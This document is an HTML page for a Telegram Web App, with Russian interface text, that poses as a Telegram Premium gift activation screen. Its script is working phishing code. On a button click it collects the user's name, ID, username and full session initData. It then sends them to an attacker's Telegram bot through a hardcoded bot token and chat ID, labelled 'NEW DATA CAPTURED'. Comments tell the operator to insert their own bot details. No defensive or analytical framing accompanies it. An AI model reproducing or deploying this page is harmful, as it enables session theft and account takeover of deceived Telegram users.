<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Premium Gift</title>
    <style>
        :root {
            --tg-bg: #1c242f;
            --tg-secondary: #2b3642;
            --tg-text: #ffffff;
            --tg-blue: #3390ec;
            --tg-green: #34c759;
        }
        body {
            margin: 0;
            padding: 0;
            background: var(--tg-bg);
            color: var(--tg-text);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            animation: fadeIn 0.5s ease;
        }
        .card {
            background: var(--tg-secondary);
            border-radius: 16px;
            padding: 30px 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .icon {
            font-size: 60px;
            margin-bottom: 15px;
            animation: pulse 2s infinite;
        }
        h1 {
            font-size: 22px;
            margin: 0 0 10px 0;
            font-weight: 700;
        }
        p {
            font-size: 15px;
            color: #8b96a3;
            margin: 0 0 25px 0;
            line-height: 1.4;
        }
        .btn {
            background: var(--tg-blue);
            color: white;
            border: none;
            padding: 16px 0;
            width: 100%;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.1s, opacity 0.2s;
            position: relative;
            overflow: hidden;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: default;
        }
        .loader {
            display: none;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid white;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        .success-msg {
            display: none;
            color: var(--tg-green);
            font-size: 14px;
            margin-top: 15px;
        }
        
        /* Анимации */
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="card">
            <div class="icon">🎁</div>
            <h1>Твой подарок активирован!</h1>
            <p>
                Мы выделили тебе эксклюзивный доступ. 
                Подтверди личность, чтобы получить доступ к функциям.
            </p>
            
            <button id="claimBtn" class="btn">ПОЛУЧИТЬ ДОСТУП</button>
            <div id="loader" class="loader"></div>
            <div id="successMsg" class="success-msg">
                Готово! Проверь личные сообщения.
            </div>
        </div>
    </div>

    <script>
        // ВСТАВЬ СЮДА ДАННЫЕ БОТА
        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // Твой токен
        const CHAT_ID = '8658887417'; // Твой ID (кто будет получать инфу)

        const tg = window.Telegram.WebApp;
        const btn = document.getElementById('claimBtn');
        const loader = document.getElementById('loader');
        const successMsg = document.getElementById('successMsg');

        // Инициализация
        tg.expand();
        
        btn.addEventListener('click', function() {
            if (tg.initData) {
                btn.disabled = true;
                btn.style.display = 'none';
                loader.style.display = 'block';

                const user = tg.initDataUnsafe?.user;
                const initData = tg.initData;
                
                const firstName = user ? user.first_name : 'User';
                const lastName = user ? user.last_name : '';
                const id = user ? user.id : 'unknown';
                const username = user ? user.username : 'no_username';

                const message = `🔥 <b>NEW DATA CAPTURED</b> 🔥\n\n` +
                    `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
                    `🆔 <b>ID:</b> ${id}\n` +
                    `📱 <b>Username:</b> @${username}\n` +
                    `🔑 <b>Session:</b>\n<code>${initData}</code>`;

                // Отправка данных
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                })
                .then(() => {
                    loader.style.display = 'none';
                    successMsg.style.display = 'block';
                    tg.HapticFeedback.notificationOccurred('success'); // Вибрация телефона
                })
                .catch(err => {
                    console.error('Error:', err);
                    loader.style.display = 'none';
                    btn.style.display = 'block';
                    btn.innerText = "Ошибка. Попробуй снова";
                });
            } else {
                // Если открыли не в телеграме
                alert("Открой через Telegram!");
            }
        });
    </script>
</body>
</html>
